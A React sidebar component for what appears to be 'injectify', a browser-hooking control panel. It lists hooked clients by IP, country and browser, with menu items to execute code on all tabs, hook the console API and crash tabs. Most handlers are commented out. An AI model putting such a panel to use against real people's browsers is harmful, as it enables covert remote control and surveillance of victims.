import ReactDOM, { render } from 'react-dom'
import React from 'react'
import { connect } from 'react-redux'

import { ContextMenu, MenuItem, ContextMenuTrigger } from 'react-contextmenu'
import copy from 'copy-to-clipboard'
import Rnd from 'react-rnd'
import Tooltip from 'material-ui/Tooltip'
import Button from 'material-ui/Button'
import List, { ListItem, ListItemIcon, ListItemText, ListSubheader } from 'material-ui/List'
import ComputerIcon from 'material-ui-icons/Computer'
import Graph from './Graph'

class Sidebar extends React.Component {
  triggerResize = () => {
    let resizeEvent = new Event('resize')
    window.dispatchEvent(resizeEvent)
  }

  render() {
    const { state } = this.props
    const { clients } = state

    return (
      <Rnd
        bounds='parent'
        default={{ width: 220 }}
        enableResizing={{
          top: false,
          right: true,
          bottom: false,
          left: false,
          topRight: false,
          bottomRight: false,
          bottomLeft: false,
          topLeft: false
        }}
        onResizeStop={this.triggerResize.bind(this)}
        disableDragging={true}
        className='inject-list-container'
        minWidth={198}
        maxWidth={350}
        resizeHandleClasses={{ right: 'resizer light' }}
      >
        <ListSubheader className='inject-list-header'>
          <ComputerIcon /> Online clients {clients ? `(${Object.keys(clients).length})` : ''}
        </ListSubheader>
        <ContextMenuTrigger id={'graph'}>
          {/* <Graph /> */}
          <Tooltip title='Execute code on all clients' placement='top'>
            <Button /*onClick={() => this.execute('*')} className='execute-all'*/>
              Execute all
            </Button>
          </Tooltip>
        </ContextMenuTrigger>
        <ContextMenu id={'graph'}>
          <MenuItem /*onClick={() => this.setState({ clientsGraph: [[]] })}*/>
            Clear graph
          </MenuItem>
          <MenuItem divider />
          <MenuItem onClick={() => copy(JSON.stringify(state.graph))}>
            Copy graph data
          </MenuItem>
        </ContextMenu>
        <List>
          {clients && Object.keys(clients).map((token, i) => {
            const client = clients[token]
            return (
              <div key={token}>
                <ContextMenuTrigger id={token}>
                  <ListItem
                    button
                    dense
                    // onClick={() => this.switchClient(token)}
                    className={state.selected.token === token ? 'active' : ''}>
                    <ListItemIcon>
                      <img src={client.images.country} />
                    </ListItemIcon>
                    <ListItemIcon>
                      <img src={client.images.browser} />
                    </ListItemIcon>
                    <ListItemText primary={client.ip.query} />
                  </ListItem>
                </ContextMenuTrigger>
                <ContextMenu id={token}>
                  <MenuItem /*onClick={() => this.execute(token)}*/>
                    Execute on all tabs
                  </MenuItem>
                  <MenuItem /*onClick={() => window.open(`https://www.iplocation.net/?query=${client.ip.query}`)}*/>
                    IP lookup
                  </MenuItem>
                  <MenuItem divider />
                  <MenuItem /*onClick={() => this.execute(token, '*', `injectify.console()`)}*/>
                    Hook / unhook console API
                  </MenuItem>
                  <MenuItem /*onClick={() => this.execute(token, '*', `injectify.module('crash')`)}*/>
                    Crash tabs
                  </MenuItem>
                </ContextMenu>
              </div>
            )
          })}
        </List>
      </Rnd>
    )
  }
}


export default connect(({ injectify: { console } }) => ({ state: console }))(Sidebar)